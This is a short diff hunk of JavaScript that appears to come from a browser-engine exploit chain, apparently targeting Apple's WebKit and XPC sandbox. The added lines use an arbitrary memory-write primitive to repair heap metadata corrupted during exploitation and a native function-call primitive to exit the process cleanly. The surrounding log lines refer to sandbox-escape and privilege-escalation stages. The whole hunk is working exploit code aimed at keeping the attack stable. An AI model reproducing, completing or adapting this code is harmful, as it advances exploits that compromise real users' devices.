@@ -6998,7 +6998,18 @@
   LOG("After xpc_connection_cancel, waiting for PE logs");
   LOG("pe_log_buf=" + pe_log_buf + " pe_log_buf_off=" + pe_log_buf_off + " globalDLSYM=" + globalDLSYM);
   sbx1_end = Date.now();
+  // Restore bmalloc metadata before returning from eval, otherwise JS GC
+  // touches corrupted emptyString metadata and crashes before sbx0 can fix it
+  LOG("Restoring bmalloc metadata after emptyString Corruption");
+  uwrite64(offsets.emptyString + 0x68n, 0x300000005n);
+  uwrite64(offsets.emptyString + 0x70n, 0x100000080n);
+  uwrite64(offsets.emptyString + 0x78n, 0n);
+  uwrite64(offsets.emptyString + 0x80n, 0x1200000001n);
+  LOG("bmalloc metadata restored");
   // PE logs were already read before XPC close
   LOG("ALL DONE!");
+  // Exit directly instead of returning to sbx0 to avoid crash during eval() return
+  LOG("Calling _exit() from sbx1");
+  wc_fcall(offsets.exit, 0n);
   //exit(0n);
 })();
